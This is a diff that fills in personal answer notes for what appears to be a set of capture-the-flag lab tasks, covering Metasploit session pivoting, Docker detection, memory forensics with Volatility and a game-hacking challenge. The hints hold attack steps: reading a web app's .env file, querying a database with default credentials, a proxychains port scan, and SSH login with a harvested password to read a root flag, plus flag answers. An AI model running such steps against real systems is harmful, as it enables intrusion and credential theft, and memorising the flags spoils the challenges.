@@ -162,21 +162,59 @@ Q: What command can be used to upgrade the last opened session to a Meterpreter 
 ** To check sessions: sessions
 A: sessions -u -1
 ===
-Q: 
-**
-A: 
+Q: What file indicates a session has been opened within a Docker container?
+** Found in task, can't see on machine?
+A: /.dockerenv
 ===
-Q: 
-**
-A: 
+Q: What file often contains useful credentials for web applications?
+** Open the first session (sessions -i -1), cat /var/www/.env
+A: .env
 ===
-Q: 
-**
-A: 
+Q: What database table contains useful credentials?
+** run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
+A: users
 ===
-Q: 
-**
-A: 
+Q: What is Santa's password?
+** 
+A: p4$$w0rd
+===
+Q: What ports are open on the host machine?
+** proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
+A:  22,80
+===
+Q: What is the root flag?
+** (!!all run in: msf6 auxiliary(scanner/ssh/ssh_login) mode!!) run ssh://santa:p4$$w0rd@172.17.0.1  >> sessions -i -1 >> ls >> cat /root/root.txt
+A: THM{47C61A0FA8738BA77308A8A600F88E4B}
+===
+///TASK 15///
+===
+Q: What is the Guard's flag?
+** Talk to guard a 2nd time after defeating him (maybe you will need to die first...)
+A: THM{5_star_Fl4gzzz}
+===
+Q: What is the Yeti's flag?
+** follow instructions, >> memorymap 0x0004b4a4 (what is health) >> chanhe to 1000 and win
+A: THM{yetiyetiyetiflagflagflag}
+===
+///TASK 16///
+===
+Q: What is the Windows version number that the memory image captured?
+** python3 vol.py -f workstation.vmem windows.info
+A: 10
+===
+Q: What is the name of the binary/gift that secret Santa left?
+** python3 vol.py -f workstation.vmem windows.psscan
+A: mysterygift.exe
+===
+Q: What is the Process ID (PID) of this binary?
+** python3 vol.py -f workstation.vmem windows.pssca
+A: 2040
+===
+Q: Dump the contents of this binary. How many files are dumped?
+** python3 vol.py -f workstation.vmem windows.dumpfiles --pid 2040
+A: 16
+===
+///TASK 17///
 
 
 
